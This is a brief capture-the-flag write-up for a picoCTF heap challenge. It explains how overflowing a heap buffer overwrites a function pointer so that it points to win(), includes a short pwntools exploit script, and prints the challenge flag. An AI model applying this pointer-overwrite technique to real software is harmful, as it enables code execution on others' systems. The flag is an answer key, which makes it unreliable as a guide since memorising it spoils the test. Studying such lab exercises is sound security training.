---
ai_date: 2025-04-27 05:29:34
ai_summary: Exploited heap overflow to overwrite x as a pointer, pointing to 'win()' function, achieving remote code execution (RCE) in a 64-bit environment.
ai_tags:
  - heap
  - rop
  - rce
created: 2024-08-08T01:09
updated: 2025-07-14T09:46
---

Just like `heap 1` we need to overwrite `x`.

| Variable     | Address     | Data   |
| ------------ | ----------- | ------ |
| `input_data` | `0x1d902b0` | `pico` |
| `x`          | `0x1d902d0` | `bico` |

But this time `x` will be used as a pointer and run.

We want it to point to `win()` of course.

Since we are in the 64bit world the pointer should be 64 bit too.

```python
from pwn import *
elf = context.binary = ELF("./chall")
t = remote('mimas.picoctf.net', 59926)
# t = elf.process()
t.sendlineafter(b": ", b"2")
t.sendlineafter(b": ", b"A"*32+p64(elf.symbols['win']))
t.sendlineafter(b": ", b"4")
info(t.recvall())
```

```flag
picoCTF{and_down_the_road_we_go_dde41590}
```